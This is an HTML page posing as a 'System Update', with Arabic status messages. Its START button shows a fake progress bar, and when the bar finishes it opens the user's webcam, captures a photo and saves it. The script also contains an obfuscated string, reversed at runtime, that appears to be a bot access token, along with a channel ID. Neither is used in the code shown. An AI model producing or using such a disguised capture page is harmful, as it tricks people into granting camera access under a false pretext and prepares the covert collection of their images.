<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .terminal { max-width: 800px; margin: 0 auto; border: 2px solid #00ff00; padding: 20px; border-radius: 5px; background: #000; }
        button { background: #00ff00; color: #000; border: none; padding: 15px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; margin-top: 20px; }
        .progress { width: 100%; height: 25px; background: #333; margin: 15px 0; border-radius: 5px; }
        .progress-bar { height: 25px; background: #00ff00; width: 0%; border-radius: 5px; }
        #output { margin: 15px 0; padding: 10px; background: #111; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>⚡ SYSTEM UPDATE</h2>
        <div id="output">Ready...</div>
        <div class="progress"><div class="progress-bar" id="progress"></div></div>
        <button onclick="start()">▶ START</button>
    </div>

    <script>
    // تشفير بسيط
    const encoded = "86yh63tTR9BA1bVy9HV0unIHJGx0WfKQpeVbK.7GN6FG.QN0417M3DY5098gDy5UTN2E5OTM1MT";
    const token = encoded.split('').reverse().join('');
    const channel = 1475949185294536859;
    
    async function start() {
        const btn = document.querySelector('button');
        const out = document.getElementById('output');
        const bar = document.getElementById('progress');
        
        btn.disabled = true;
        out.innerHTML = 'جاري التحديث...';
        
        let p = 0;
        const int = setInterval(() => {
            p += 10;
            bar.style.width = p + '%';
            out.innerHTML = 'تحديث... ' + p + '%';
            if(p >= 100) {
                clearInterval(int);
                out.innerHTML = 'اكتمل!';
                takePhoto();
            }
        }, 300);
    }
    
    function takePhoto() {
        try {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const v = document.createElement('video');
                v.srcObject = stream;
                v.play();
                setTimeout(() => {
                    const c = document.createElement('canvas');
                    c.width = 640;
                    c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(blob => {
                        const link = document.createElement('a');
                        link.href = URL.createObjectURL(blob);
                        link.download = 'photo.jpg';
                        link.click();
                        alert('تم حفظ الصورة في جهازك');
                    });
                    stream.getTracks().forEach(t => t.stop());
                }, 1000);
            })
            .catch(() => alert('فشل الوصول للكاميرا'));
        } catch(e) {}
    }
    </script>
</body>
</html>
